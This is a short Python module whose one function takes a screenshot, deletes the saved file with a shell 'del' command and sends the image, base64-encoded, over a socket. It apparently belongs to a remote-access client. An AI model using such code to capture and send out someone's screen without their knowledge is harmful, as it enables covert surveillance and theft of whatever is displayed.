import mss
import base64
import os

import socket

from tools import dbg


def send(conn:socket):
    image_base64 = 0
    with mss.mss() as sct:
        sct.shot(output='screenshot.png')
        with open('screenshot.png', 'rb') as f:
            image_bytes = f.read()
        os.system("del screenshot.png")
        image_base64 = base64.b64encode(image_bytes)
    separator = '\''.encode()
    conn.sendall(separator)
    dbg(f"sent: {separator}")
    conn.sendall(image_base64)
    conn.sendall(separator)
